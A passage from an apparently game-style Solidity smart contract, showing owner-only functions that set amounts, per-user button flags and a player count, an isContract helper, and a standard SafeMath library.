            
             selfAmt1 = _selfAmt1; 
             selfAmt2 = _selfAmt2; 
             selfAmt3 = _selfAmt3; 
             selfAmt4 = _selfAmt4; 
             selfAmt5 = _selfAmt5; 
             return true;
        }
        
        function updateButtonAd(
        address userAddress,
        bool button1,
        bool button2,
        bool button3,
        bool button4,
        bool button5,
        bool button6,
        bool button7,
        bool button8,
        bool button9,
        bool button10
        ) public onlyOwner returns(bool){
            updatebuttons[userAddress].b1 = button1;
            updatebuttons[userAddress].b2 = button2;
            updatebuttons[userAddress].b3 = button3;
            updatebuttons[userAddress].b4 = button4;
            updatebuttons[userAddress].b5 = button5;
            updatebuttons[userAddress].b6 = button6;
            updatebuttons[userAddress].b7 = button7;
            updatebuttons[userAddress].b8 = button8;
            updatebuttons[userAddress].b9 = button9;
            updatebuttons[userAddress].b10 = button10;
            return true;
        }
         
        function totalPlayersAd(uint256 _total) public onlyOwner returns(bool) {
            totalPlayers = _total;
            return true;
        }
        
        function isContract(address addr) private view returns (bool) {
          uint size;
          assembly { size := extcodesize(addr) }
          return size > 0;
        }

    
    
    
}






library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}